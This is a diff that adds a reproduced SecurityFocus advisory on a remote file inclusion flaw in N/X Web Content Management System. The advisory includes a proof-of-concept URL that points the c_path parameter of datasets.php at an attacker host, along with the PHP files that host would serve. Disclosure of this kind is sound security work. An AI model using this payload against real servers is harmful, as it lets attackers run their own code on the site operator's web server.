@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/6500/info
+ 
+N/X Web Content Management System is prone to an issue which may allow remote attackers to include arbitrary files located on remote servers.
+ 
+An attacker may exploit this by supplying a path to a maliciously created file, located on an attacker-controlled host as a value for some parameters.
+ 
+If the remote file is a PHP script, this may allow for execution of attacker-supplied PHP code with the privileges of the webserver. Successful exploitation may provide local access to the attacker. 
+
+http://[target]/nx/common/dbo/datasets.php?c_path=http://[attacker]/
+with :
+http://[attacker]/common/dbo/saveset.php
+http://[attacker]/common/dbo/recordset.php
+http://[attacker]/common/dbo/deleteset.php
+http://[attacker]/common/dbo/updateset.php
+http://[attacker]/common/dbo/insertset.php 
